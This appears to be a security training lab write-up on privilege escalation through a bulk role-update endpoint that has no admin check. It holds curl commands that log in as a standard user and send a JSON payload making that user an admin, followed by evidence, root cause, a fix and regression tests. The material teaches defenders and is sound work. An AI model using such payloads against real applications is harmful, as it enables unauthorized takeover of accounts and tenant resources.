# Lab 4 — Privilege Escalation via Bulk Role Assignment

## 1. Objective

Demonstrate how missing role-based access control (RBAC) checks on administrative batch-update endpoints allow standard authenticated users to assign administrative privileges to their own accounts.

## 2. Scenario

An administrative control interface exposes a bulk role assignment endpoint designed for tenant administrators to adjust user roles. The backend route processes a batch list of user IDs and desired roles. However, the endpoint fails to verify that the requesting session possesses administrative privileges.

**Trust boundary:** The application assumed that non-administrative users could not access or invoke administrative management API routes.

## 3. Preconditions

| Item | Value |
|------|-------|
| Attacker account | `alice` / `alice123` (role: `user`, user ID 2) |
| Target configuration | Elevate user ID 2 to role `admin` with `permissions: all` |
| Seed state | Initial database seed (`POST /reset`) |

## 4. Vulnerability Mechanism

The vulnerable route permits any logged-in user to execute role updates without verifying `session['role'] == 'admin'`:

```sql
UPDATE roles SET role_name = ?, permissions = ? WHERE user_id = ? AND tenant_id = ?
```

An unprivileged user can craft a JSON payload targeting their own user record and grant themselves elevated permissions.

## 5. Reproduction

1. Authenticate as standard user `alice`:

```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=alice&password=alice123"
```

2. Submit a bulk role update payload:

```bash
curl -b cookies.txt -X POST http://localhost:5000/lab/bac/bac-04/roles/bulk-update \
  -H "Content-Type: application/json" \
  -d '{"updates": [{"user_id": 2, "role_name": "admin", "permissions": "all"}]}'
```

3. Confirm that the server returns HTTP 200 indicating successful role updates.

## 6. Evidence

The response demonstrates that the update was applied:

```json
{
  "count": 1,
  "status": "updated"
}
```

Inspection of the `roles` table confirms user 2 now possesses the `admin` role.

## 7. Root Cause

**File:** `app/routes/bac.py`  
**Function:** `lab04_bulk_update_roles()`

In vulnerable mode, the endpoint only verifies authentication via `_require_login()` without checking administrative authorization:

```python
if patched:
    if session.get('role') != 'admin':
        return jsonify({'error': 'Forbidden: Administrator privileges required'}), 403
```

## 8. Impact

Standard users can escalate privileges to full administrator status, gaining unauthorized control over tenant resources, user management, and sensitive operations.

## 9. Remediation

Enforce administrative role verification prior to processing privilege modification requests:

```python
if session.get('role') != 'admin':
    return jsonify({'error': 'Forbidden: Administrator privileges required'}), 403
```

## 10. Regression Validation

**Test:** `tests/test_lab_04.py`

- **Vulnerable mode:** User Alice updates role to admin → HTTP 200.
- **Patched mode:** User Alice updates role to admin → HTTP 403.
- **Legitimate flow:** Administrator updates roles → HTTP 200.

## 11. Research Discussion

1. Why are bulk or batch APIs disproportionately prone to missing authorization checks compared to singular resource routes?
2. How do declarative role-checking decorators or middleware frameworks reduce administrative authorization omissions?
3. What auditing and alerting mechanisms should be deployed to monitor unauthorized role modification attempts?
